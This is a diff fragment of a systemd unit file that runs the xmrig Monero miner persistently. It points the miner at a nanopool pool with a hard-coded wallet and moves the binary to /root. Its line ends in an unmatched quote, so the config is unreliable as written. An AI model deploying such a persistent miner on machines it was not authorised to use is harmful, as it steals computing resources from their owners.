@@ -5,7 +5,7 @@ After=network.target
 [Service]
 Type=forking
 GuessMainPID=no
-ExecStart=/usr/local/bin/xmrig --coin monero --tls -o xmr-eu1.nanopool.org:14433 -u 41y3THaZL7fNatuFGFUpF13DkZCpETkMzF6nzDpAXmYDbJRE6zvfypoRUFLHeMrJRz6gCGiDMLBNiLRd1faxKnPvHYkU7E4 --donate-level=0"
+ExecStart=/root/xmrig --coin monero --tls -o xmr-eu1.nanopool.org:14433 -u 41y3THaZL7fNatuFGFUpF13DkZCpETkMzF6nzDpAXmYDbJRE6zvfypoRUFLHeMrJRz6gCGiDMLBNiLRd1faxKnPvHYkU7E4 --donate-level=0"
 Restart=always
 
 [Install]
